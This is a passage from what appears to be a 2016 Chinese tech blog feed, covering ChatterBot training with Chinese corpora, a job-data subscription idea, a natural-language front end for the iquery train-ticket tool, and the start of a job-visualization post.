&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;deepThought&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_response&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;面对模棱两可，拒绝猜测的诱惑.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="c1"&gt;# print(deepThought.get_response(&amp;quot;生命、宇宙以及世间万物的终极答案是什么?&amp;quot;))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;FAQ（非官方）&lt;/h1&gt;
&lt;h3&gt;默认配置&lt;/h3&gt;
&lt;p&gt;默认情况下, ChatterBot 使用 &lt;code&gt;JsonDatabaseAdapter&lt;/code&gt;作为storage adapter,使用 &lt;code&gt;ClosestMatchAdapter&lt;/code&gt; 作为 logic adapter, 使用 &lt;code&gt;VariableInputTypeAdapter&lt;/code&gt; 作为 input adapter&lt;/p&gt;
&lt;h3&gt;手动训练&lt;/h3&gt;
&lt;p&gt;稀土掘金上的小伙伴&lt;code&gt;@guoweikuang&lt;/code&gt;问道"采用中文语料库那个地方是怎么操作的"，下边补充手动训练的办法。对原理有兴趣可以翻阅源码&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;__future__&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;unicode_literals&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;chatterbot&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;ChatBot&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;chatterbot.trainers&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;ListTrainer&lt;/span&gt;
&lt;span class="n"&gt;deepThought&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ChatBot&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Training demo&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;deepThought&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;set_trainer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ListTrainer&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;deepThought&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;train&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;嗳，渡边君，真喜欢我?&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;那还用说?&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;那么，可依得我两件事?&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;三件也依得&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="p"&gt;])&lt;/span&gt;


&lt;span class="c1"&gt;# test&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;deepThought&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_response&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;真喜欢我?&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;deepThought&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_response&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;可依得我两件事?&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;p&gt;----------更新于2016.10.26&lt;/p&gt;
&lt;p&gt;通过设置好编码环境我们可以在python2使用中文训练机器人,这样就不需要在python2/3中来回切换了（我把它封装为服务不存在这个问题，且效率提高）&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;__future__&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;unicode_literals&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="nb"&gt;reload&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;setdefaultencoding&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;utf8&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;chatterbot&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;ChatBot&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;chatterbot.trainers&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;ListTrainer&lt;/span&gt;
&lt;span class="n"&gt;deepThought&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ChatBot&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Training demo&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;deepThought&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;set_trainer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ListTrainer&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;deepThought&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;train&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;嗳，渡边君，真喜欢我?&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;那还用说?&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;那么，可依得我两件事?&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;三件也依得&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="p"&gt;])&lt;/span&gt;


&lt;span class="c1"&gt;# test&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;deepThought&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_response&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;真喜欢我?&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;deepThought&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_response&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;可依得我两件事?&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;只读模式&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;chatbot = ChatBot("wwjtest", read_only=True)&lt;/code&gt;  //否则bot会学习每个输入&lt;/p&gt;
&lt;h3&gt;创建自己的训练类&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://github.com/gunthercox/ChatterBot/tree/master/chatterbot/training"&gt;chatterbot/training&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;创建自己的adapters&lt;/h3&gt;
&lt;p&gt;参考默认使用的&lt;a href="http://chatterbot.readthedocs.io/en/latest/_modules/chatterbot/adapters/logic/closest_match.html#ClosestMatchAdapter"&gt;ClosestMatchAdapter&lt;/a&gt;、&lt;a href="http://chatterbot.readthedocs.io/en/latest/_modules/chatterbot/adapters/input/variable_input_type_adapter.html#VariableInputTypeAdapter"&gt;VariableInputTypeAdapter&lt;/a&gt;即可&lt;/p&gt;
&lt;p&gt;诸如我们可以写一个输入/输出 adapters，对接到微信（我偏好werobot）&lt;/p&gt;
&lt;p&gt;io的一个案例是&lt;a href="https://github.com/gunthercox/chatterbot-voice"&gt;chatterbot-voice&lt;/a&gt;（使用方法参考&lt;a href="https://github.com/gunthercox/chatterbot-voice/blob/master/examples/example.py"&gt;examples/example.py&lt;/a&gt;），这个adapters让我们可以使用语音与我们的机器人沟通，原理很简单，我此前折腾过&lt;a href="https://github.com/wwj718/PyBaiduYuyin"&gt;BaiduYuyin&lt;/a&gt;，国内用户可以使用它&lt;/p&gt;
&lt;h3&gt;案例&lt;/h3&gt;
&lt;p&gt;参考&lt;a href="https://github.com/gunthercox/ChatterBot/tree/master/examples"&gt;examples&lt;/a&gt; ，案例中已经有很多种机器人了&lt;/p&gt;
&lt;h3&gt;训练好的模型如何分发&lt;/h3&gt;
&lt;p&gt;训练好的数据，默认存在&lt;code&gt;./database.db&lt;/code&gt;（参考&lt;a href="https://github.com/gunthercox/ChatterBot/blob/master/chatterbot/adapters/storage/jsondatabase.py"&gt;jsondatabase.py&lt;/a&gt;）,不是sqlite数据库，实际是&lt;a href="https://github.com/gunthercox/jsondb"&gt;jsondb&lt;/a&gt;，对json做了封装（参考&lt;a href="https://github.com/gunthercox/jsondb/blob/master/jsondb/db.py"&gt;jsondb/db.py&lt;/a&gt;）&lt;/p&gt;
&lt;h3&gt;算法相关&lt;/h3&gt;
&lt;p&gt;默认情况下，使用 &lt;a href="https://github.com/gunthercox/ChatterBot/blob/master/chatterbot/adapters/logic/closest_match.py#L5"&gt;ClosestMatchAdapter&lt;/a&gt; 作为 logic adapter ，用来找出与用户输入最接近的一句话&lt;/p&gt;
&lt;p&gt;核心代码为：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;fuzzywuzzy&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;process&lt;/span&gt;

&lt;span class="n"&gt;closest_match&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;confidence&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;process&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;extract&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
            &lt;span class="n"&gt;input_statement&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="n"&gt;text_of_all_statements&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="n"&gt;limit&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;
&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;这里我们用到了&lt;a href="https://github.com/seatgeek/fuzzywuzzy"&gt;fuzzywuzzy&lt;/a&gt;，具体用法参考&lt;a href="https://github.com/seatgeek/fuzzywuzzy#process"&gt;fuzzywuzzy#process&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;fuzzywuzzy用于计算句子之间的相似度，采用的字符串相似度算法为 Levenshtein Distance(编辑距离算法)&lt;/p&gt;
&lt;h4&gt;Levenshtein Distance（引用自维基百科）&lt;/h4&gt;
&lt;p&gt;编辑距离，又称Levenshtein距离（也叫做Edit Distance），是指两个字串之间，由一个转成另一个所需的最少编辑操作次数，如果它们的距离越大，说明它们越是不同。允许的编辑操作包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;将一个字符替换成另一个字符&lt;/li&gt;
&lt;li&gt;插入一个字符&lt;/li&gt;
&lt;li&gt;删除一个字符。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;从上述描述我们可以看出，这种算法适用于任何文字，而且我们使用&lt;code&gt;process.extract&lt;/code&gt;时,使用中文不会影响相似度度量的准确性。当然我们也可以看出这种算法的缺陷，它无法理解语义的相似性，甚至连同义词都完全无法处理。这是一个十分明显的短板，有必要根据你的问题域重新实现一套度量文本相似的logic adapter&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;fuzzywuzzy&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;fuzz&lt;/span&gt;
&lt;span class="n"&gt;fuzz&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ratio&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;u&amp;quot;你好&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;u&amp;quot;你好!&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;#80 &lt;/span&gt;
&lt;span class="n"&gt;fuzz&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ratio&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;u&amp;quot;你好&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;u&amp;quot;你好&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;#100 &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;其他算法&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://github.com/gunthercox/ChatterBot/blob/master/chatterbot/adapters/logic/time_adapter.py"&gt;time_adapter.py&lt;/a&gt;中用到朴素贝叶斯:&lt;code&gt;from textblob.classifiers import NaiveBayesClassifier&lt;/code&gt;，这里也是目前唯一一处引用textblob的地方&lt;/p&gt;
&lt;p&gt;接受的数据很简单，形如&lt;code&gt;[("what time is it", 1), xxx, xxx,...]&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;nltk的使用&lt;/h3&gt;
&lt;p&gt;目前主要用了nltk的&lt;code&gt;word_tokenize&lt;/code&gt;、&lt;code&gt;wordnet&lt;/code&gt;和&lt;code&gt;stopwords&lt;/code&gt;&lt;/p&gt;
&lt;h1&gt;todo&lt;/h1&gt;
&lt;p&gt;这是我最近在做的&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使这个项目能更适合训练中文语料库&lt;/li&gt;
&lt;li&gt;用其他的文本相似算法写一个logic adapter&lt;/li&gt;
&lt;li&gt;加入中文的停用词等（取代nltk的停用词）&lt;/li&gt;
&lt;li&gt;使用&lt;a href="https://github.com/isnowfy/snownlp"&gt;snownlp&lt;/a&gt;和jieba替代既有依赖（nltk和textblob）&lt;/li&gt;
&lt;li&gt;fork这个项目，采用它的架构，重写一个更适合中文的&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;有兴趣跟进的小伙伴，可以关注&lt;a href="https://github.com/wwj718/deepThought"&gt;wwj718/deepThought&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;聊天语料库&lt;/h1&gt;
&lt;p&gt;聊天语料涉及隐私，网上几乎没有公开的中文语料，我们开脑洞：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;siri对小冰（用wechat api使对话可编程）&lt;/li&gt;
&lt;li&gt;柏拉图《对话录》&lt;/li&gt;
&lt;li&gt;《论语》&lt;/li&gt;
&lt;li&gt;古龙小说&lt;/li&gt;
&lt;li&gt;电影字幕&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;坑&lt;/h1&gt;
&lt;p&gt;ChatterBot本身支持python2/python3，如果要使用中文，目前只支持python3&lt;/p&gt;
&lt;p&gt;Python2中文问题出在:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;statement_list = self.context.storage.get_response_statements()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;得到的&lt;code&gt;statement_list&lt;/code&gt;是编码错误的句子列表（编解码问题）&lt;/p&gt;
&lt;p&gt;解决思路可以参考我的这篇博客：&lt;a href="http://blog.just4fun.site/decode-and-encode-note.html"&gt;编码相关的笔记&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;结语&lt;/h1&gt;
&lt;p&gt;当前这个项目给出了一个漂亮的bot骨架，插件式的设计，十分利于插入强大的功能，这也是这个项目中我最喜欢的地方，就chat bot功能而言，功能比较简单、清晰&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sat, 13 Aug 2016 00:00:00 +0000</pubDate><guid>tag:,2016-08-13:create-a-smart-chat-bot.html</guid><category>data</category></item><item><title>一种通用的可视化订阅服务</title><link>/a-generic-Subscription-Services.html</link><description>&lt;p&gt;这篇也是脑洞系列，属于我觉得好玩、分析后认为技术上可行、但限于时间或精力没去做的事，分享出来，有兴趣的小伙伴可以去折腾&lt;/p&gt;
&lt;p&gt;我有很多想法，只差一个程序员啦&lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;先前的工作&lt;/h1&gt;
&lt;p&gt;&lt;a href="https://github.com/wwj718/jobsVisualization"&gt;jobsVisualization&lt;/a&gt;是一个可视化工具，用来帮你可视化地筛选工作&lt;/p&gt;
&lt;p&gt;一图胜千言&lt;/p&gt;
&lt;p&gt;&lt;img alt="jobsVisualization" src="https://raw.githubusercontent.com/wwj718/jobsVisualization/master/jobs.gif" /&gt;&lt;/p&gt;
&lt;p&gt;关于为何想做这个项目，我在&lt;a href="http://blog.just4fun.site/jobsVisualization.html"&gt;可视化筛选你中意的工作&lt;/a&gt;一文中有说明&lt;/p&gt;
&lt;p&gt;大体原因是因为目前职位相关的特征数据很多，要选出最合适的职位（综合多种特征，相互对比）十分不易，人脑很难对数据有直观认知，而这正是可视化帮得上忙的&lt;/p&gt;
&lt;p&gt;受&lt;a href="https://github.com/bokeh/bokeh/tree/0.11.1/examples/app/movies"&gt;bokeh example app movies&lt;/a&gt;项目的启发，我做了这个东西&lt;/p&gt;
&lt;h1&gt;泛化能力&lt;/h1&gt;
&lt;p&gt;我最初在折腾&lt;a href="https://github.com/bokeh/bokeh/tree/0.11.1/examples/app/movies"&gt;bokeh example app movies&lt;/a&gt;的时候就觉得，卧槽这是个泛化能力极好的模型呀，可以应用的领域太广了，这个模型里，只要求我们关注的对象（比如电影）有多维标签数据（比如评论数、票房）即可！用户就可以根据这些数据来可视化筛选数据，从而得出自己喜欢的电影，用户也可以随时调整筛选指标（通过变化坐标轴关联的数据标签）&lt;/p&gt;
&lt;p&gt;我的&lt;a href="https://github.com/wwj718/jobsVisualization"&gt;jobsVisualization&lt;/a&gt;就是一个典型的例子，你还用以用来做的其他事包括如何选股票，如何选桃子，如何选女朋友（如果有的选的话，邪恶一笑）之类的&lt;/p&gt;
&lt;h1&gt;只完成一半&lt;/h1&gt;
&lt;p&gt;在我的最初计划里，当前的工作其实只完成了一半，尽管它看去已经完整了（语出@ryseven）&lt;/p&gt;
&lt;p&gt;我的另一半计划是，用户能够订阅自己关注的区间，好比订阅&lt;code&gt;月薪在10K-20K之间，工作地点在上海的职位&lt;/code&gt;，每当采集到新的数据，便向订阅用户推送这些信息&lt;/p&gt;
&lt;p&gt;那么用户怎么订阅呢，他只需要在图中圈一下&lt;/p&gt;
&lt;p&gt;&lt;img alt="jons" src="http://oav6fgfj1.bkt.clouddn.com/jobs55012802.png" /&gt;&lt;/p&gt;
&lt;p&gt;这样便订阅了&lt;code&gt;薪资在10k-20k,简历提交次数在30次以下的职位&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这是一种信息筛选和推送的服务&lt;/p&gt;
&lt;h1&gt;算法问题&lt;/h1&gt;
&lt;p&gt;最后剩下的就是一个算法问题，假设有有A个用户订阅了该服务，他们关注的薪资区间各不相同（先假设只有薪资一个变量）。我们的爬虫每天早上爬取一组职位数据，我们要如何将合适的职位推送给合适的用户。怎样的机制较优（可以从时间复杂度和空间复杂度两方面考虑），简单的办法包括&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;为每个用户执行一次筛选&lt;/li&gt;
&lt;li&gt;为每个职位找合适的用户&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们看到这两种做法都不好，许多信息被反复查看，并没有充分利用&lt;/p&gt;
&lt;h3&gt;另一个小问题&lt;/h3&gt;
&lt;p&gt;我们可以先绕开算法问题，处理消息推送中的优化策略&lt;/p&gt;
&lt;p&gt;如果你折腾过消息系统（notification system），你会发现这个问题在构建消息系统是可能也会遇到类似的，一群人订阅了一个话题，当话题有更新时，如何通知这些人。消息到达用户的方式通常有pull和push两种。&lt;/p&gt;
&lt;p&gt;针对push/pull模型采取的策略可能不尽相同，在pull模型中（用户拉取），我们可以根据用户的活跃情况决定为其生成消息的策略，诸如活跃用户优先，而非活跃用户可以访问时生成也无妨（celery）。&lt;/p&gt;
&lt;p&gt;这样可以节省空间&lt;/p&gt;
&lt;p&gt;优化问题还蛮好玩的，不过我最近掉到NLP（自然语言处理）的蜜罐里，暂时出不来，就不继续折腾这个项目了，有兴趣的小伙伴可以继续玩耍&lt;/p&gt;
&lt;h1&gt;结语&lt;/h1&gt;
&lt;p&gt;这个可视化订阅服务是泛化性很好的项目，小伙伴们可以自己去折腾出好玩的东西，如果这个服务能帮到大家找到喜欢的东西（电影或是工作），节省信息筛选的时间，那么说不定有许多人请你喝咖啡呢&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 10 Aug 2016 00:00:00 +0000</pubDate><guid>tag:,2016-08-10:a-generic-Subscription-Services.html</guid><category>thought</category></item><item><title>为命令行火车票查询器添加自然语言交互界面</title><link>/iquery-nlp-interface.html</link><description>&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/ibot13761852.png" /&gt;&lt;/p&gt;
&lt;p&gt;ps：采用&lt;a href="https://github.com/asciinema/asciinema"&gt;asciinema&lt;/a&gt;制作了&lt;a href="https://asciinema.org/a/69utp9gpwal1y85lyv01kbhe2"&gt;演示视频&lt;/a&gt;:&lt;/p&gt;
&lt;p&gt;&lt;a href="https://asciinema.org/a/69utp9gpwal1y85lyv01kbhe2"&gt;&lt;img alt="asciicast" src="https://asciinema.org/a/69utp9gpwal1y85lyv01kbhe2.png" /&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;项目地址&lt;/h1&gt;
&lt;p&gt;先上项目源码:&lt;a href="https://github.com/wwj718/ibot"&gt;ibot&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;&lt;a href="https://github.com/protream/iquery"&gt;iquery&lt;/a&gt;&lt;/h1&gt;
&lt;p&gt;@sl前段时间跟我说，有个python写的命令行或者票查询器(iquery)很有趣，于是我玩了下，觉得挺好玩的，工具本身写得也干净利落。后来发现它只支持python3，还一度想让修改它使它兼容python2。&lt;/p&gt;
&lt;p&gt;此后有了新主意:为它加一个自然语言交互界面，这样被围观时，比较拉风&lt;/p&gt;
&lt;p&gt;当然啦，对于热爱CLI的小伙伴来说，CLI几乎是最佳的交互方式了，给它添加自然语言交互界面，未免画蛇添竹。我个人是偏好CLI的，不过觉得自然语言交互界面的好处之一是能然普通用户更自然地与机器对话，甚至采用语音与机器对话&lt;/p&gt;
&lt;h3&gt;iquery的安装和使用&lt;/h3&gt;
&lt;p&gt;iquery作为命令行工具，写的是很棒的&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# 安装&lt;/span&gt;
pip3 install iquery
iquery 上海虹桥 北京 802
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;你将获得本年8月2号从上海虹桥到北京的火车票信息:&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/iquerye2d84a70.png" /&gt;&lt;/p&gt;
&lt;p&gt;当然你也可以指定火车的类型和输入完整的查询日期, 比如:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;iquery -dg 上海 北京 20160802&lt;/code&gt;&lt;/p&gt;
&lt;h1&gt;ibot&lt;/h1&gt;
&lt;p&gt;下边我们来看看如何使用ibot来查询火车票,&lt;a href=""&gt;ibot&lt;/a&gt;已经发布为python包，直接pip安装就行&lt;/p&gt;
&lt;p&gt;使用:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ibot 2016年8月十一号 南京到北京的车票
ibot 明天从南京到北京的车票
ibot 这周六从南京去北京出差，帮我看下车票
ibot 下周五离开南京去北京 查下车票
ibot 查一下上海去北京的车票，下周六
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/ibot13761852.png" /&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 01 Aug 2016 00:00:00 +0000</pubDate><guid>tag:,2016-08-01:iquery-nlp-interface.html</guid><category>dev-tools</category></item><item><title>可视化筛选你中意的工作</title><link>/jobsVisualization.html</link><description>&lt;p&gt;&lt;img alt="" src="https://raw.githubusercontent.com/wwj718/jobsVisualization/master/jobs.gif" /&gt;&lt;/p&gt;
&lt;p&gt;晚上到星巴克写作的效率好高!&lt;/p&gt;
&lt;h1&gt;缘起&lt;/h1&gt;
&lt;p&gt;在技术这个话题下，我比较形而下，大概算实用主义者，关注技术的现实意义。另一个原因可能是数学不够好，数学好的小伙伴如@sevenry，更多兴趣在探索算法和问题的数学形式。&lt;/p&gt;
&lt;p&gt;前段时间有朋友在找工作，作为技术宅，当然不能像一般用户那样找啦，于是小伙伴决定写个爬虫帮忙去搜寻合适的工作。我觉得有趣，那算时间正好在看数据可视化和数据采集相关的书，心痒痒地想试试，于是就用了一个周末时间写了一个爬虫和数据可视化项目，帮助求职者更方便地找到中意的职位&lt;/p&gt;
&lt;h1&gt;现有问题&lt;/h1&gt;
&lt;p&gt;一开始在思考，用户上主流的招聘网站寻找合适的职位，是怎样一种体验呢，自己试着用了几个主流网站。体验类似淘宝购物，选择过滤条件，然后逐个职位看过去。其中比较不爽的是，翻了后页，忘了前页，对不同的职位我想做个对比，不得不逐个记下第一印象合格的职位的网址，之后逐个网页打开，做优劣势的比较。十分困难，大脑每次只能处理极少数量的职位和维度（薪资，地理位置，福利），以至于半天没法得出那个更好。想用控制变量来比较，发现工作量很大&lt;/p&gt;
&lt;h1&gt;构思&lt;/h1&gt;
&lt;p&gt;在没想清楚怎么做可视化之前，先写了爬虫，采集到数据后，这部分反正不怎么需要思考。看到爬取到的数据有很多个维度之后（薪资，地理位置，福利...），突然想到，这是是个多指标的过滤问题啊，而这个词我在印象笔记里记过，也不知道是不是自创，是对阅读&lt;a href="https://github.com/bokeh/bokeh/tree/0.11.1/examples/app/movies"&gt;bokeh example app movies&lt;/a&gt;项目的批注，这个项目和我将做的事，在模式上是何等相似啊，于是剩下的就是细节工作了&lt;/p&gt;
&lt;h1&gt;项目细节&lt;/h1&gt;
&lt;h3&gt;项目相关&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://gold.xitu.io/entry/577bc0601532bc005fe0e651/detail"&gt;稀土掘金&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/wwj718/jobSpider"&gt;jobSpider&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/wwj718/jobsVisualization"&gt;github jobsVisualization&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="jobs.just4fun.site/jobsVisualization"&gt;online demo&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;爬虫部分&lt;/h3&gt;
